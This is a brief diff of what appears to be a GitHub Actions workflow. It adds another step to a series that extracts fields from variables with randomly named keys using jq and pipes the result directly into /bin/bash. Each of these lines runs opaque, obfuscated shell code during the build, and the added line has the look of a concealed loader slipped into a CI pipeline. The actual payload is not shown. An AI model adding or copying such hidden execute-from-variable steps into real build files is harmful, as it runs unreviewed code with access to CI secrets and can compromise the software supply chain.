@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
           echo $bi2 | jq -r .fepoq49339 | /bin/bash
           echo $jya4 | jq -r .t82333 | /bin/bash
+          echo $oywd61 | jq -r .bak7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
